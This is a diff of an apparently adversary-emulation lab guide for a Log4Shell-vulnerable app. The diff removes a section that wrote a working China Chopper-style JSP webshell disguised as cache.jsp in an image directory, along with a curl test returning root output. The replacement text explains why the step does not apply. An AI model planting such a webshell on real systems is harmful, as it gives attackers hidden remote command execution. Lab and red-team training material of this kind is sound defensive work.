@@ -346,78 +346,26 @@ Two things to keep in mind with the dumb shell:
   avoid signals altogether.
 - Pipes and semicolons work normally: `id; whoami; hostname`
 
-### 2.2 Deploy JSP Webshell (China Chopper Pattern)
+### 2.2 JSP Webshell — Not Applicable for This Target
 
-**Why this path:** `/resources/imgs/` looks like a static image directory. A `.jsp` file there is
-plausible enough to avoid immediate scrutiny. The China Chopper pattern (one-liner parameter-based
-shell) is one of APT41's most extensively documented webshell families.
+The `christophetd/log4shell-vulnerable-app` runs as a **Spring Boot fat JAR** with embedded Tomcat.
+There is no `webapps/` directory on the filesystem — all static content lives inside the JAR.
+JSP webshell deployment requires a writable webroot exposed by the HTTP server, which does not exist here.
 
 ```bash
 [WEB01]
-# Find where Tomcat serves files from
-# The vulnerable app uses Spring Boot with embedded Tomcat — check for webapps directory
+# Confirm: no webapps directory
 find / -name "webapps" -type d 2>/dev/null | grep -v proc
-# Common paths: /opt/tomcat/webapps/ROOT  or  the Spring Boot app serves from classpath
+# (no output)
 
-# For the ghcr.io/christophetd/log4shell-vulnerable-app image:
-find / -name "*.jar" -path "*/spring*" 2>/dev/null | head -3
-# The app runs from /app/spring-webmvc-demo.jar — static content is in the jar, not the filesystem
-
-# Check if there's a static directory we can write to
-find / -name "static" -type d 2>/dev/null | grep -v proc
-# Or: write to /tmp and exploit the webshell via another path
-
-# Option A: If a writable webroot exists
-ls -la /var/lib/tomcat*/webapps/ROOT/ 2>/dev/null || ls -la /opt/tomcat/webapps/ROOT/ 2>/dev/null
-
-# Option B: Write to /tmp and access via reverse shell / implant
-# (Spring Boot embedded apps don't expose /tmp via HTTP, so use Option A if available)
+# Confirm: app runs from a fat JAR
+ls /app/
+# spring-webmvc-demo.jar  (or similar)
 ```
 
-```bash
-[WEB01]
-# Write JSP webshell to discovered webroot
-# Adjust path based on what find returned above
-WEBROOT="/opt/tomcat/webapps/ROOT"    # adjust if different
-mkdir -p ${WEBROOT}/resources/imgs
-
-cat > ${WEBROOT}/resources/imgs/cache.jsp << 'JSPEOF'
-<%@page import="java.util.*,java.io.*"%><%
-String cmd = request.getParameter("c");
-if(cmd != null && !cmd.isEmpty()) {
-    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
-    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
-    StringBuilder sb = new StringBuilder();
-    String line;
-    while((line = br.readLine()) != null) sb.append(line).append("\n");
-    out.print(sb.toString());
-}
-%>
-JSPEOF
-
-# Verify file was written
-ls -la ${WEBROOT}/resources/imgs/cache.jsp
-```
-
-**Test the webshell from Kali:**
-```bash
-[KALI]
-# Test via GET parameter — URL-encode spaces as %20 or use --data-urlencode
-curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id%3Bwhoami%3Bhostname"
-```
-
-**Expected:**
-```
-uid=0(root) gid=0(root) groups=0(root),...
-root
-web01
-```
-
-> **Note:** If the Spring Boot app doesn't have a writable webroot, execute commands via the existing
-> reverse shell or RxPhage implant instead. The webshell is a convenience — not required to proceed.
-
-**SIEM alert fired:**
-- Sysmon EID 11 (FileCreate): `.jsp` file created in Tomcat webroot — **HIGH**
+**In a real engagement** against a traditional Tomcat deployment (`/opt/tomcat/webapps/ROOT/`),
+the China Chopper JSP webshell — a one-liner documented in APT41 intrusions — would be written here.
+This lab skips that step. Proceed directly to §2.3 to deploy the RxPhage implant via the reverse shell.
 
 ### 2.3 Deploy RxPhage Implant
 
